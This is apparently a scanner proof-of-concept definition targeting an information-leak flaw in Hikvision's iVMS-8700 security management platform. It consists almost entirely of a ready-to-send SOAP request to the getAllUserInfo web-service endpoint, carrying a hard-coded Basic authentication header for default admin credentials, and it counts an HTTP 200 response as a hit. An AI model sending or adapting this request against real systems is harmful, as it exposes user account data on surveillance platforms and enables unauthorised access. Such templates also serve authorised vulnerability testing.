{
        'name': '海康威视iVMS-8700综合安防管理平台getAllUserInfo存在信息泄露',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/services/IWsBaseService.IWsBaseServiceHttpSoap11Endpoint',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                'Authorization': 'Basic YWRtaW46MTIzNDU2',
                'Connection': 'close'
            },
            'data': ''' <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:impl="http://impl.ws.api.base.cms.hikvision.com" 
xmlns:xsd="http://ws.common.cms.hikvision.com/xsd">
 <soapenv:Header/>
<soapenv:Body>
 <impl:getAllUserInfo>
 <impl:request>
 <!--type: int-->
 <xsd:pageNo>1</xsd:pageNo>
 <!--type: int-->
 <xsd:pageSize>1</xsd:pageSize>
 </impl:request>
 <!--type: long-->
 <impl:updTime></impl:updTime>
 </impl:getAllUserInfo>
 </soapenv:Body>
 </soapenv:Envelope>''',
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': False
        }}]
    }